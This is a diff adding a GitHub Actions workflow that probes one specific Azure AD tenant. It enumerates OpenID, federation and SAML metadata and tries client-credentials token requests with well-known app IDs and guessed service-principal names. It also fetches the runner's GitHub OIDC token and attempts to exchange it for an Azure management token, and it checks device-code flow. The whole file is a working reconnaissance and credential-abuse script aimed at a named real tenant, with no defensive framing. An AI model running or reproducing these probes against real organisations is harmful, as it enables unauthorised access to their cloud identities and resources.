@@ -1,0 +1,79 @@
+name: Tenant Probe
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Probe Azure AD Tenant"
+        run: |
+          TENANT="398a6654-997b-47e9-b12b-9515b896b4de"
+          
+          echo "=== 1. Tenant OpenID Configuration ==="
+          curl -s "https://login.microsoftonline.com/$TENANT/.well-known/openid-configuration" | jq .
+          
+          echo ""
+          echo "=== 2. Tenant Metadata ==="
+          curl -s "https://login.microsoftonline.com/$TENANT/v2.0/.well-known/openid-configuration" | jq .
+          
+          echo ""
+          echo "=== 3. Check Federation Metadata ==="
+          curl -s "https://login.microsoftonline.com/$TENANT/federationmetadata/2007-06/federationmetadata.xml" | head -50
+          
+          echo ""
+          echo "=== 4. Try to get tenant info via Graph ==="
+          curl -s "https://graph.microsoft.com/v1.0/tenantRelationships/findTenantInformationByTenantId(tenantId='$TENANT')" | jq .
+          
+          echo ""
+          echo "=== 5. Check for common app client IDs ==="
+          # Try well-known Microsoft app IDs against this tenant
+          for APP_ID in \
+            "00000003-0000-0000-c000-000000000000" \
+            "00000002-0000-0000-c000-000000000000" \
+            "1950a258-227b-4e31-a9cf-717495945fc2"; do
+            echo "--- App: $APP_ID ---"
+            curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+              -d "client_id=$APP_ID&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" 2>&1 | head -5
+          done
+          
+          echo ""
+          echo "=== 6. Try GitHub OIDC federation to tenant ==="
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
+          
+          # Try to exchange GitHub OIDC for Azure token
+          curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+            -d "client_id=00000000-0000-0000-0000-000000000000" \
+            -d "scope=https://management.azure.com/.default" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=$OIDC_TOKEN" | jq .
+          
+          echo ""
+          echo "=== 7. Enumerate common service principal names ==="
+          # These are common names that might have federated identity
+          for NAME in github-actions actions-runner hosted-compute runner oidc-federation; do
+            echo "--- Trying: $NAME ---"
+            curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+              -d "client_id=$NAME" \
+              -d "scope=https://management.azure.com/.default" \
+              -d "grant_type=client_credentials" \
+              -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              -d "client_assertion=$OIDC_TOKEN" 2>&1 | head -3
+          done
+          
+          echo ""
+          echo "=== 8. Check for device code flow (sometimes misconfigured) ==="
+          curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/devicecode" \
+            -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
+            -d "scope=https://graph.microsoft.com/.default" | jq .
+          
+          echo ""
+          echo "=== 9. Try to get tenant branding/info ==="
+          curl -s "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/authorize?client_id=test&response_type=code&redirect_uri=http://localhost" -o /dev/null -w "%{http_code}\n" -L 2>&1 | head -5
+          
+          echo ""
+          echo "=== 10. Check SAML metadata ==="
+          curl -s "https://login.microsoftonline.com/$TENANT/saml2" | head -30
